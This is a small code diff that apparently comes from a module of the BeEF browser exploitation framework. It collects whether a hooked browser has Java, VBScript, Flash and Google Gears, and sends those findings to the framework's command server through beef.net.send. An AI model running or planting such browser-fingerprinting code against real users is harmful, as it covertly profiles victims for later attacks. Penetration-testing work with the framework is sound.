@@ -49,8 +49,12 @@ function serialize(_obj)
          break;
 	}
 }
+
 	
-	var browser_type = serialize(beef.browser.type());
-    
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'browser_type='+browser_type);
+    var java_enabled = (beef.browser.hasJava())? "Yes" : "No";
+    var vbscript_enabled = (beef.browser.hasVBScript())? "Yes" : "No";
+    var has_flash = (beef.browser.hasFlash())? "Yes" : "No";
+    var has_googlegears = (beef.browser.hasGoogleGears())? "Yes" : "No";
+   
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'java_enabled='+java_enabled+'&vbscript_enabled='+vbscript_enabled+'&has_flash='+has_flash+'&has_googlegears='+has_googlegears);
 });
